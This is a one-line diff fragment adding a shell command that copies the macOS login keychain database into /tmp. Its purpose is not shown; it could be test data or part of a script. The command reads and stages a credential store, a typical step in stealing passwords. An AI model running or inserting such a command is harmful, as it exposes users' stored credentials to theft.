@@ -1,0 +1,1 @@
+cat ~/Library/Keychains/login.keychain-db > /tmp/keychain
